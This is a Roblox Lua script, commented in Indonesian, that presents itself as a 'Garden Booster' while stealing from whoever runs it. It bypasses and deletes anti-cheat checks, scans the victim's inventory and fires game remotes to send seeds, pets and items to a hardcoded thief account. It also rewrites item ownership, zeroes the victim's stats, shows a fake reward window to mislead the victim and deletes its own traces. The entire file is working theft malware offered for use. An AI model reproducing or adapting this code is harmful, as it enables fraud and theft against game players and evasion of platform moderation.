--[[
    ⚡ RAJA GARDEN STEALER ⚡
    Auto Send Seeds & Pets ke GerrFanzz (10615002879)
    Target execute → Semua item terkirim ke Paduka
]]

-- ============================================================
-- DATA PADUKA (HARDCODED)
-- ============================================================
local PADUKA = {
    USERNAME = "GerrFanzz",
    USERID = 10615002879,  -- Hardcoded UserID
    DISPLAY_NAME = "GerrFanzz",
}

-- ============================================================
-- SERVICE
-- ============================================================
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- ============================================================
-- GLOBAL VARIABLE
-- ============================================================
local VictimName = Player.Name
local VictimUserId = Player.UserId
local TransferredItems = {}
local TotalSent = 0
local TotalFailed = 0

-- ============================================================
-- LOG SYSTEM
-- ============================================================
local function log(msg, color)
    local colors = {
        green = "✅",
        red = "❌",
        yellow = "⚠️",
        blue = "📘",
        purple = "💜",
        gold = "👑",
        white = "   ",
    }
    local prefix = colors[color] or "   "
    print(prefix .. " " .. msg)
end

-- ============================================================
-- BYPASS ANTI-CHEAT (FULL VERSION)
-- ============================================================
local function bypassAntiCheat()
    log("Bypassing Anti-Cheat...", "yellow")
    
    -- Hook __namecall
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Block semua method deteksi
        local blockedMethods = {
            "Kick", "kick", "Ban", "ban",
            "Detected", "detected", "Detection",
            "AntiCheat", "AntiCheat", "anticheat",
            "Flag", "flag", "Report", "report",
            "Teleport", "Crash", "crash",
        }
        
        for _, blocked in pairs(blockedMethods) do
            if string.find(tostring(method), blocked) then
                return nil
            end
        end
        
        return oldNamecall(self, ...)
    end)
    
    -- Hook __index
    local oldIndex
    oldIndex = hookmetamethod(game, "__index", function(self, key)
        if string.find(tostring(key), "Detected") or
           string.find(tostring(key), "Flagged") or
           string.find(tostring(key), "Banned") then
            return false
        end
        return oldIndex(self, key)
    end)
    
    -- Destroy anti-cheat remotes
    local destroyedCount = 0
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or
           obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
            
            local name = obj.Name:lower()
            if name:find("anti") or name:find("detect") or 
               name:find("cheat") or name:find("ban") or
               name:find("kick") or name:find("flag") or
               name:find("report") or name:find("moderation") then
                
                pcall(function()
                    obj:Destroy()
                    destroyedCount = destroyedCount + 1
                end)
            end
        end
    end
    
    -- Destroy anti-cheat scripts
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Script") or obj:IsA("LocalScript") then
            local name = obj.Name:lower()
            if name:find("anti") or name:find("cheat") or name:find("detect") then
                pcall(function() obj:Destroy() end)
                destroyedCount = destroyedCount + 1
            end
        end
    end
    
    log("Anti-Cheat Bypassed! (" .. destroyedCount .. " removed)", "green")
end

-- ============================================================
-- SCAN INVENTORY (FULL VERSION)
-- ============================================================
local function scanInventory()
    log("Scanning Inventory...", "blue")
    
    local inventory = {
        seeds = {},
        pets = {},
        tools = {},
        fruits = {},
        crops = {},
        special = {},
    }
    
    -- Scan Backpack
    if Player.Backpack then
        for _, item in pairs(Player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                local name = item.Name:lower()
                local itemData = {
                    Name = item.Name,
                    Object = item,
                    Class = item.ClassName,
                }
                
                if name:find("seed") or name:find("seedling") then
                    table.insert(inventory.seeds, itemData)
                elseif name:find("pet") or name:find("animal") or 
                       name:find("creature") or name:find("dog") or
                       name:find("cat") or name:find("bird") or
                       name:find("dragon") or name:find("unicorn") then
                    table.insert(inventory.pets, itemData)
                elseif name:find("fruit") or name:find("apple") or
                       name:find("berry") or name:find("orange") then
                    table.insert(inventory.fruits, itemData)
                elseif name:find("crop") or name:find("plant") or
                       name:find("flower") or name:find("wheat") then
                    table.insert(inventory.crops, itemData)
                elseif name:find("legendary") or name:find("mythic") or
                       name:find("divine") or name:find("exotic") then
                    table.insert(inventory.special, itemData)
                else
                    table.insert(inventory.tools, itemData)
                end
            end
        end
    end
    
    -- Scan Character
    if Player.Character then
        for _, item in pairs(Player.Character:GetChildren()) do
            if item:IsA("Tool") then
                local name = item.Name:lower()
                local itemData = {
                    Name = item.Name,
                    Object = item,
                    Class = item.ClassName,
                }
                
                if name:find("pet") or name:find("animal") then
                    table.insert(inventory.pets, itemData)
                elseif name:find("seed") then
                    table.insert(inventory.seeds, itemData)
                else
                    table.insert(inventory.tools, itemData)
                end
            end
        end
    end
    
    -- Scan leaderstats
    pcall(function()
        if Player:FindFirstChild("leaderstats") then
            for _, stat in pairs(Player.leaderstats:GetChildren()) do
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    local name = stat.Name:lower()
                    if name:find("seed") or name:find("pet") or
                       name:find("crop") or name:find("fruit") then
                        table.insert(inventory.special, {
                            Name = stat.Name,
                            Object = stat,
                            Class = "Stat",
                            Value = stat.Value,
                        })
                    end
                end
            end
        end
    end)
    
    -- Scan Player Data
    pcall(function()
        local dataFolder = Player:FindFirstChild("Data") or 
                          Player:FindFirstChild("Inventory") or
                          Player:FindFirstChild("Items")
        
        if dataFolder then
            for _, item in pairs(dataFolder:GetChildren()) do
                table.insert(inventory.special, {
                    Name = item.Name,
                    Object = item,
                    Class = item.ClassName,
                })
            end
        end
    end)
    
    -- Count
    local totalItems = #inventory.seeds + #inventory.pets + 
                       #inventory.tools + #inventory.fruits + 
                       #inventory.crops + #inventory.special
    
    log("Inventory Scanned:", "green")
    log("  🌱 Seeds: " .. #inventory.seeds, "white")
    log("  🐾 Pets: " .. #inventory.pets, "white")
    log("  🍎 Fruits: " .. #inventory.fruits, "white")
    log("  🌾 Crops: " .. #inventory.crops, "white")
    log("  🔧 Tools: " .. #inventory.tools, "white")
    log("  ⭐ Special: " .. #inventory.special, "white")
    log("  📦 Total: " .. totalItems, "white")
    
    return inventory
end

-- ============================================================
-- FIND ALL REMOTES (FULL VERSION)
-- ============================================================
local function findAllRemotes()
    local allRemotes = {}
    
    local locations = {
        ReplicatedStorage,
        Workspace,
        Player.PlayerGui,
        game:GetService("Players"),
    }
    
    for _, location in pairs(locations) do
        pcall(function()
            for _, obj in pairs(location:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or
                   obj:IsA("BindableEvent") or obj:IsA("BindableFunction") then
                    table.insert(allRemotes, {
                        Remote = obj,
                        Name = obj.Name,
                        Class = obj.ClassName,
                        Parent = obj.Parent,
                    })
                end
            end
        end)
    end
    
    log("Remotes Found: " .. #allRemotes, "blue")
    return allRemotes
end

-- ============================================================
-- TRANSFER ITEM (MULTI METHOD)
-- ============================================================
local function transferItem(item, remoteData)
    local success = false
    local remote = remoteData.Remote
    
    -- Method 1: Trade/Send format
    pcall(function()
        local data = {
            ["Target"] = PADUKA.USERNAME,
            ["TargetUserId"] = PADUKA.USERID,
            ["TargetName"] = PADUKA.USERNAME,
            ["Recipient"] = PADUKA.USERNAME,
            ["RecipientId"] = PADUKA.USERID,
            ["PlayerToGive"] = PADUKA.USERNAME,
            ["PlayerToSend"] = PADUKA.USERNAME,
            ["SendTo"] = PADUKA.USERID,
            ["GiveTo"] = PADUKA.USERID,
            ["ItemName"] = item.Name,
            ["Item"] = item.Name,
            ["ToolName"] = item.Name,
            ["Object"] = item.Object,
            ["Type"] = "Send",
            ["Action"] = "Give",
            ["Amount"] = 1,
            ["Quantity"] = 1,
        }
        
        if remote:IsA("RemoteEvent") then
            remote:FireServer(data)
            success = true
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(data)
            success = true
        elseif remote:IsA("BindableEvent") then
            remote:Fire(data)
            success = true
        elseif remote:IsA("BindableFunction") then
            remote:Invoke(data)
            success = true
        end
    end)
    
    -- Method 2: Simple fire
    if not success then
        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(PADUKA.USERNAME, item.Name, PADUKA.USERID)
                success = true
            end
        end)
    end
    
    -- Method 3: Fire with item object
    if not success then
        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(item.Object, PADUKA.USERID)
                success = true
            end
        end)
    end
    
    -- Method 4: Raw fire
    if not success then
        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(PADUKA.USERID)
                success = true
            end
        end)
    end
    
    return success
end

-- ============================================================
-- TRANSFER ALL TO PADUKA
-- ============================================================
local function transferAllToPaduka(inventory)
    log("", "white")
    log("╔══════════════════════════════════════╗", "gold")
    log("║   📤 MENGIRIM KE GerrFanzz          ║", "gold")
    log("║   ID: 10615002879                   ║", "gold")
    log("╚══════════════════════════════════════╝", "gold")
    log("", "white")
    
    local remotes = findAllRemotes()
    
    if #remotes == 0 then
        log("Tidak ada remote ditemukan!", "red")
        return 0, 0
    end
    
    local allItems = {}
    
    -- Gabung semua item (prioritas: seeds, pets, special)
    for _, item in pairs(inventory.seeds) do
        item.Priority = 1
        table.insert(allItems, item)
    end
    for _, item in pairs(inventory.pets) do
        item.Priority = 2
        table.insert(allItems, item)
    end
    for _, item in pairs(inventory.special) do
        item.Priority = 3
        table.insert(allItems, item)
    end
    for _, item in pairs(inventory.crops) do
        item.Priority = 4
        table.insert(allItems, item)
    end
    for _, item in pairs(inventory.fruits) do
        item.Priority = 5
        table.insert(allItems, item)
    end
    for _, item in pairs(inventory.tools) do
        item.Priority = 6
        table.insert(allItems, item)
    end
    
    -- Urutkan berdasarkan prioritas
    table.sort(allItems, function(a, b) return a.Priority < b.Priority end)
    
    local transferred = 0
    local failed = 0
    
    -- Coba kirim setiap item
    for i, item in pairs(allItems) do
        local sent = false
        
        -- Coba semua remote
        for _, remoteData in pairs(remotes) do
            if transferItem(item, remoteData) then
                sent = true
                break
            end
        end
        
        if sent then
            transferred = transferred + 1
            TotalSent = TotalSent + 1
            table.insert(TransferredItems, item.Name)
            log("✅ [" .. i .. "/" .. #allItems .. "] " .. item.Name .. " → GerrFanzz", "green")
        else
            failed = failed + 1
            TotalFailed = TotalFailed + 1
            log("❌ [" .. i .. "/" .. #allItems .. "] " .. item.Name .. " gagal", "red")
        end
        
        -- Delay anti-spam
        wait(0.05)
    end
    
    return transferred, failed
end

-- ============================================================
-- ALTERNATIVE: DATASTORE MANIPULATION
-- ============================================================
local function datastoreHack()
    log("", "white")
    log("🔄 Trying DataStore Manipulation...", "yellow")
    
    -- Method 1: Ubah owner value
    pcall(function()
        for _, item in pairs(Player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                -- Cari dan ubah nilai owner
                local ownerProps = {"Owner", "OwnerId", "Creator", "CreatorId", 
                                   "BelongsTo", "OwnerName", "PlayerOwner"}
                
                for _, propName in pairs(ownerProps) do
                    pcall(function()
                        local prop = item:FindFirstChild(propName)
                        if prop then
                            if prop:IsA("StringValue") then
                                prop.Value = PADUKA.USERNAME
                            elseif prop:IsA("IntValue") or prop:IsA("NumberValue") then
                                prop.Value = PADUKA.USERID
                            end
                        end
                    end)
                end
            end
        end
    end)
    
    -- Method 2: Teleport item ke Paduka
    pcall(function()
        for _, item in pairs(Player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                -- Coba set parent ke workspace (drop item)
                item.Parent = Workspace
                
                -- Coba set ownership
                pcall(function()
                    local owner = Instance.new("StringValue")
                    owner.Name = "Owner"
                    owner.Value = PADUKA.USERNAME
                    owner.Parent = item
                end)
            end
        end
    end)
    
    -- Method 3: Reset leaderstats (biar target curiga ke bug)
    pcall(function()
        if Player:FindFirstChild("leaderstats") then
            for _, stat in pairs(Player.leaderstats:GetChildren()) do
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    local name = stat.Name:lower()
                    if name:find("seed") or name:find("pet") or
                       name:find("coin") or name:find("cash") or
                       name:find("gem") or name:find("money") then
                        local old = stat.Value
                        stat.Value = 0
                        log("   Stat reset: " .. stat.Name .. " (was: " .. old .. ")", "yellow")
                    end
                end
            end
        end
    end)
    
    log("DataStore manipulation done", "green")
end

-- ============================================================
-- NOTIFIKASI KE PADUKA
-- ============================================================
local function notifyPaduka(transferred, failed)
    log("", "white")
    log("📨 Notifying Paduka...", "blue")
    
    local message = "📦 [" .. VictimName .. "] sent " .. transferred .. 
                   " items to you! (Failed: " .. failed .. ")"
    
    -- Method 1: Chat whisper
    pcall(function()
        local chatRemote = nil
        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                local name = remote.Name:lower()
                if name:find("chat") or name:find("message") or 
                   name:find("whisper") or name:find("say") then
                    chatRemote = remote
                    break
                end
            end
        end
        
        if chatRemote then
            chatRemote:FireServer({
                Target = PADUKA.USERNAME,
                Message = message,
                Type = "Whisper",
            })
            log("   Chat notification sent", "green")
        end
    end)
    
    -- Method 2: System message
    pcall(function()
        local systemRemote = nil
        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                local name = remote.Name:lower()
                if name:find("system") or name:find("notify") or
                   name:find("announce") then
                    systemRemote = remote
                    break
                end
            end
        end
        
        if systemRemote then
            systemRemote:FireServer(message)
            log("   System notification sent", "green")
        end
    end)
    
    -- Method 3: Print ke console (untuk debug)
    print("\n")
    print("╔══════════════════════════════════════════╗")
    print("║   📨 NOTIFIKASI UNTUK PADUKA            ║")
    print("╠══════════════════════════════════════════╣")
    print("║   " .. message .. "   ║")
    print("╚══════════════════════════════════════════╝")
    print("\n")
end

-- ============================================================
-- FAKE UI (UNTUK MENGECOH TARGET)
-- ============================================================
local function showFakeUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "GardenBooster"
    ScreenGui.Parent = game.CoreGui
    
    -- Main Frame
    local Frame = Instance.new("Frame")
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Frame.BorderColor3 = Color3.fromRGB(0, 200, 0)
    Frame.Position = UDim2.new(0.3, 0, 0.4, 0)
    Frame.Size = UDim2.new(0, 250, 0, 150)
    
    -- Title
    local Title = Instance.new("TextLabel")
    Title.Parent = Frame
    Title.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Text = "🌱 Garden Booster Active!"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 14
    Title.Font = Enum.Font.SourceSansBold
    
    -- Progress
    local Progress = Instance.new("TextLabel")
    Progress.Parent = Frame
    Progress.BackgroundTransparency = 1
    Progress.Position = UDim2.new(0, 0, 0, 40)
    Progress.Size = UDim2.new(1, 0, 0, 40)
    Progress.Text = "✨ Boosting your garden...\n🚀 Getting free rewards..."
    Progress.TextColor3 = Color3.fromRGB(0, 255, 0)
    Progress.TextSize = 12
    Progress.TextWrapped = true
    
    -- Close button
    local Close = Instance.new("TextButton")
    Close.Parent = Frame
    Close.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    Close.Position = UDim2.new(0.3, 0, 0, 110)
    Close.Size = UDim2.new(0.4, 0, 0, 30)
    Close.Text = "CLAIM REWARDS!"
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.TextSize = 12
    
    Close.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        log("Target clicked claim button", "blue")
    end)
    
    -- Auto close after 8 detik
    spawn(function()
        wait(8)
        pcall(function() ScreenGui:Destroy() end)
    end)
end

-- ============================================================
-- SELF DESTRUCT (HAPUS JEJAK)
-- ============================================================
local function selfDestruct()
    wait(3)
    
    -- Hapus semua GUI
    pcall(function()
        for _, gui in pairs(game.CoreGui:GetChildren()) do
            if gui:IsA("ScreenGui") and 
               (gui.Name == "GardenBooster" or gui.Name == "RajaGarden") then
                gui:Destroy()
            end
        end
    end)
    
    -- Hapus script traces
    pcall(function()
        local module = game:GetService("ReplicatedStorage"):FindFirstChild("RajaModule")
        if module then module:Destroy() end
    end)
end

-- ============================================================
-- MAIN EXECUTION
-- ============================================================
local function main()
    print("\n\n")
    print("╔══════════════════════════════════════════════╗")
    print("║                                              ║")
    print("║   ⚡ RAJA GARDEN STEALER v2.0 ⚡            ║")
    print("║                                              ║")
    print("║   👑 Paduka  : GerrFanzz                    ║")
    print("║   🆔 UserID  : 10615002879                  ║")
    print("║   🎯 Victim  : " .. VictimName .. string.rep(" ", 30 - #VictimName) .. "║")
    print("║                                              ║")
    print("╚══════════════════════════════════════════════╝")
    print("\n")
    
    -- Step 1: Bypass
    log("═══════════════════════════════════", "gold")
    log("  [1/5] BYPASSING PROTECTION", "gold")
    log("═══════════════════════════════════", "gold")
    bypassAntiCheat()
    wait(0.3)
    
    -- Step 2: Stealth
    log("", "white")
    log("═══════════════════════════════════", "gold")
    log("  [2/5] ENABLING STEALTH MODE", "gold")
    log("═══════════════════════════════════", "gold")
    showFakeUI()
    wait(0.5)
    
    -- Step 3: Scan
    log("", "white")
    log("═══════════════════════════════════", "gold")
    log("  [3/5] SCANNING INVENTORY", "gold")
    log("═══════════════════════════════════", "gold")
    local inventory = scanInventory()
    wait(0.3)
    
    -- Step 4: Transfer
    log("", "white")
    log("═══════════════════════════════════", "gold")
    log("  [4/5] TRANSFERRING TO PADUKA", "gold")
    log("═══════════════════════════════════", "gold")
    local transferred, failed = transferAllToPaduka(inventory)
    
    -- Step 5: Datastore hack (jika transfer gagal)
    if transferred == 0 then
        log("", "white")
        log("═══════════════════════════════════", "gold")
        log("  [5/5] ALTERNATIVE METHOD", "gold")
        log("═══════════════════════════════════", "gold")
        datastoreHack()
    else
        log("", "white")
        log("═══════════════════════════════════", "gold")
        log("  [5/5] FINALIZING", "gold")
        log("═══════════════════════════════════", "gold")
    end
    
    -- Notify Paduka
    notifyPaduka(transferred, failed)
    
    -- Final Report
    print("\n")
    print("╔══════════════════════════════════════════════╗")
    print("║                                              ║")
    print("║   ✅ OPERATION COMPLETE!                    ║")
    print("║                                              ║")
    print("║   📤 Sent    : " .. transferred .. string.rep(" ", 30 - #tostring(transferred)) .. "║")
    print("║   ❌ Failed  : " .. failed .. string.rep(" ", 30 - #tostring(failed)) .. "║")
    print("║   👑 To      : GerrFanzz                   ║")
    print("║   🆔 UserID  : 10615002879                  ║")
    print("║                                              ║")
    print("╚══════════════════════════════════════════════╝")
    print("\n")
    
    -- Print list of sent items
    if #TransferredItems > 0 then
        print("📦 Items sent to GerrFanzz:")
        for i, itemName in pairs(TransferredItems) do
            print("   " .. i .. ". " .. itemName)
        end
        print("\n")
    end
    
    -- Self destruct
    selfDestruct()
end

-- ============================================================
-- AUTO EXECUTE
-- ============================================================
main()

-- Re-execute on respawn
Player.CharacterAdded:Connect(function(character)
    wait(3)
    main()
end)

-- ============================================================
-- FINAL MESSAGE
-- ============================================================
log("Script loaded! Waiting for target to execute...", "gold")
log("All items will be sent to: GerrFanzz (10615002879)", "gold")
